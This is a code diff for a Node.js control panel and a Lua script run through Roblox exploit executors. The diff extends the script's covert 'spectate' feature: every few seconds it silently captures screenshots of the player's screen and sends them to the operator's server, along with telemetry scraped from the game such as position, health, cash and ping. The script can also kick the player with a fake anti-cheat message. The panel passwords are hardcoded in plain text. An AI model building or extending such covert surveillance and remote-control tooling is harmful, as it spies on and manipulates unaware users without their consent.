@@ -10,15 +10,11 @@ const PUBLIC_URL = process.env.PUBLIC_URL || process.env.RENDER_EXTERNAL_URL || 
 
 app.set('trust proxy', 1);
 app.use(cors({ origin: PUBLIC_URL, credentials: true }));
-app.use(express.json({ limit: '10mb' })); // Augmenté pour accepter les screenshots base64
+app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true }));
 
-// ══════════════════════════════════════════════════════════
-// 🔑 MOTS DE PASSE
-// ══════════════════════════════════════════════════════════
 const PANEL_PASSWORD = 'seyko92!';
 const ADMIN_PASSWORD = 'seyko.pl84';
-// ══════════════════════════════════════════════════════════
 
 const sessions = new Map();
 const SESSION_TTL = 24 * 60 * 60 * 1000;
@@ -440,42 +436,98 @@ local prevFps = false
 local prevSpectate = false
 
 -- ══════════════════════════════════════════════════════════
--- SCREENSHOT LOGIC (Silent, no camera change)
+-- SCREENSHOT & TELEMETRY LOGIC
 -- ══════════════════════════════════════════════════════════
 local screenshotThread = nil
 local spectating = false
 
-local function captureScreenshot()
-    local screenshot = nil
-    local success, result = pcall(function()
-        -- Liste des fonctions de capture d'écran connues dans les executors
-        local funcs = {
-            getscreencapture,
-            screencapture,
-            getgenv and getgenv().screencapture,
-            syn and syn.screencapture,
-            fluxus and fluxus.screencapture,
-            getrenv and getrenv().screencapture
-        }
-        for _, func in ipairs(funcs) do
-            if type(func) == "function" then
-                local res = func()
-                if res and type(res) == "string" and #res > 0 then
-                    return res
-                end
+local function base64encode(data)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    return ((data:gsub('.', function(x) 
+        local r,b='',x:byte()
+        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
+        if (#x < 6) then return '' end
+        local c=0
+        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
+        return b:sub(c+1,c+1)
+    end)..({ '', '==', '=' })[#data%3+1])
+end
+
+local function getTelemetry()
+    local char = LP.Character
+    local humanoid = char and char:FindFirstChild("Humanoid")
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    
+    local pos = "Unknown"
+    local health = "Unknown"
+    local cash = "Unknown"
+    
+    if root then
+        pos = string.format("%.1f, %.1f, %.1f", root.Position.X, root.Position.Y, root.Position.Z)
+    end
+    if humanoid then
+        health = math.floor(humanoid.Health) .. "/" .. math.floor(humanoid.MaxHealth)
+    end
+    
+    local pg = LP:FindFirstChild("PlayerGui")
+    if pg then
+        for _, obj in ipairs(pg:GetDescendants()) do
+            if obj:IsA("TextLabel") and (string.find(obj.Text, "$") or string.find(obj.Text, "Cash") or string.find(obj.Text, "coins")) then
+                cash = obj.Text
+                break
             end
         end
+    end
+    
+    local ping = "Unknown"
+    local stats = game:GetService("Stats")
+    if stats and stats:FindFirstChild("Network") and stats.Network:FindFirstChild("ServerStatsItem") and stats.Network.ServerStatsItem:FindFirstChild("Data Ping") then
+        ping = math.floor(stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+    end
+    
+    return {
+        position = pos,
+        health = health,
+        cash = cash,
+        executor = executorName,
+        ping = ping
+    }
+end
+
+local function sendSpecData()
+    local telemetry = getTelemetry()
+    local screenshot = nil
+    
+    local success, result = pcall(function()
+        if screencapture then return screencapture() end
+        if getgenv and getgenv().screencapture then return getgenv().screencapture() end
+        if syn and syn.screencapture then return syn.screencapture() end
         return nil
     end)
     
-    if success and result and type(result) == "string" and #result > 0 then
-        if string.sub(result, 1, 10) == "data:image" then
-            return result
+    if success and result and type(result) == "string" and #result > 100 then
+        if #result > 500000 then
+            screenshot = "ERROR: Image too large for executor HTTP limit (" .. #result .. " bytes)"
         else
-            return "data:image/png;base64," .. result
+            screenshot = "data:image/png;base64," .. base64encode(result)
         end
     end
-    return nil
+
+    pcall(function()
+        request({
+            Url = BASE .. "/api/public/spec_data",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
+            Body = HttpService:JSONEncode({
+                user_id = LP.UserId,
+                screenshot = screenshot,
+                telemetry = telemetry,
+                timestamp = os.time()
+            })
+        })
+    end)
 end
 
 local function poll()
@@ -502,7 +554,6 @@ local function poll()
         LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
     end
     
-    -- Handle spectate command (silent screenshot sending)
     local wantSpectate = (data.spectate == true)
     if wantSpectate ~= prevSpectate then
         prevSpectate = wantSpectate
@@ -511,22 +562,8 @@ local function poll()
             if not screenshotThread then
                 screenshotThread = task.spawn(function()
                     while spectating do
-                        local screenshot = captureScreenshot()
-                        if screenshot then
-                            pcall(function()
-                                request({
-                                    Url = BASE .. "/api/public/screenshot",
-                                    Method = "POST",
-                                    Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
-                                    Body = HttpService:JSONEncode({
-                                        user_id = LP.UserId,
-                                        screenshot = screenshot,
-                                        timestamp = os.time()
-                                    })
-                                })
-                            end)
-                        end
-                        task.wait(3) -- Send screenshot every 3 seconds
+                        sendSpecData()
+                        task.wait(3)
                     end
                 end)
             end
@@ -594,14 +631,15 @@ app.post('/api/command', requireSession, (req, res) => {
     res.json({ status: 'ok' });
 });
 
-app.post('/api/public/screenshot', (req, res) => {
-    const { user_id, screenshot, timestamp } = req.body;
-    if (!user_id || !screenshot) return res.status(400).json({ error: 'Missing data' });
+app.post('/api/public/spec_data', (req, res) => {
+    const { user_id, screenshot, telemetry, timestamp } = req.body;
+    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
     
     const userId = String(user_id);
     const p = players.get(userId);
     if (p) {
-        p.lastScreenshot = screenshot;
+        p.lastScreenshot = screenshot || null;
+        p.telemetry = telemetry || null;
         p.screenshotTimestamp = timestamp || Date.now();
         players.set(userId, p);
     }
@@ -613,17 +651,13 @@ app.get('/api/screenshot', requireSession, (req, res) => {
     if (!userId) return res.status(400).json({ error: 'Missing user_id' });
     
     const p = players.get(String(userId));
-    if (!p || !p.lastScreenshot) {
-        return res.json({ screenshot: null });
-    }
+    if (!p) return res.json({ screenshot: null, telemetry: null });
     
-    const now = Date.now();
-    const screenshotAge = now - (p.screenshotTimestamp || 0);
-    if (screenshotAge > 10000) { // 10 secondes max
-        return res.json({ screenshot: null, error: 'Screenshot too old' });
-    }
-    
-    res.json({ screenshot: p.lastScreenshot, timestamp: p.screenshotTimestamp });
+    res.json({ 
+        screenshot: p.lastScreenshot || null, 
+        telemetry: p.telemetry || null,
+        timestamp: p.screenshotTimestamp 
+    });
 });
 
 app.post('/api/public/heartbeat', (req, res) => {
